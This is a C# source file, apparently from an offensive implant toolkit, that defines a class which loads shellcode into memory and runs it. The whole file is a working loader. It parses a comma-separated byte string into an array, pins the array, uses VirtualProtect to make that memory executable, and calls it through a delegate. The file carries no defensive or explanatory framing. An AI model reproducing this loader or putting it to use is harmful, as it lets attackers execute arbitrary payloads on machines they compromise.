using System;
using System.Runtime.InteropServices;

using MonkeyWorks.Unmanaged.Headers;
using MonkeyWorks.Unmanaged.Libraries;

namespace WheresMyImplant
{
    internal class InjectShellCodeManaged : Base, IDisposable
    {
        private const Char DELIMITER = ',';

        private String shellCodeString;

        private delegate void FunctionPointer();

        ////////////////////////////////////////////////////////////////////////////////
        // https://github.com/subTee/EvilWMIProvider/blob/master/EvilWMIProvider/EvilWMIProvider.cs
        ////////////////////////////////////////////////////////////////////////////////
        internal InjectShellCodeManaged(String shellCodeString)
        {
            this.shellCodeString = shellCodeString;
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void Execute()
        {
            String[] shellCodeArray = shellCodeString.Split(DELIMITER);
            Byte[] bShellCode = new Byte[shellCodeArray.Length];
            for (Int32 i = 0; i < shellCodeArray.Length; i++)
            {
                Int32 value = (Int32)new System.ComponentModel.Int32Converter().ConvertFromString(shellCodeArray[i]);
                bShellCode[i] = Convert.ToByte(value);
            }

            GCHandle handle = GCHandle.Alloc(bShellCode, GCHandleType.Pinned);
            Winnt.MEMORY_PROTECTION_CONSTANTS fOldProtected = Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_NOACCESS;
            kernel32.VirtualProtect(handle.AddrOfPinnedObject(), (UInt32)bShellCode.Length, Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_EXECUTE_READ, ref fOldProtected);

            FunctionPointer fuctionPointer = (FunctionPointer)Marshal.GetDelegateForFunctionPointer(handle.AddrOfPinnedObject(), typeof(FunctionPointer));

            fuctionPointer();
        }

        ///////////////////////////////////////////////////////////////////////////////
        //
        ///////////////////////////////////////////////////////////////////////////////
        ~InjectShellCodeManaged()
        {
            Dispose();
        }

        ///////////////////////////////////////////////////////////////////////////////
        //
        ///////////////////////////////////////////////////////////////////////////////
        public void Dispose()
        {

        }

    }
}